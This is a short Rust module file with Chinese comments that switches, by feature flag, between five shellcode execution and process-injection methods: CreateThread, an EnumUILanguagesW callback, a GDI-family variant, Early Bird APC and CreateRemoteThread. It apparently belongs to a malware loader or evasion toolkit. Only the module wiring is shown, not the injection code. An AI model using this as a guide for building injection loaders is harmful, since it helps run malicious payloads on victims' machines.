// CreateThread + WaitForSingleObject 方式
#[cfg(feature = "run_create_thread")]
mod create_thread;
#[cfg(feature = "run_create_thread")]
pub use crate::exec::create_thread::exec;


// EnumUILanguagesW 回调方式
#[cfg(feature = "run_enum_ui")]
mod enum_ui;
#[cfg(feature = "run_enum_ui")]
pub use crate::exec::enum_ui::exec;


// GDI 家族变种注入
#[cfg(feature = "run_gdi_families")]
mod gdi_families;
#[cfg(feature = "run_gdi_families")]
pub use crate::exec::gdi_families::exec;

// Early Bird APC 注入方式
#[cfg(feature = "run_early_bird_apc")]
mod early_bird_apc;
#[cfg(feature = "run_early_bird_apc")]
pub use crate::exec::early_bird_apc::exec;

// CreateRemoteThread 远程注入方式
#[cfg(feature = "run_create_remote_thread")]
mod create_remote_thread;
#[cfg(feature = "run_create_remote_thread")]
pub use crate::exec::create_remote_thread::exec;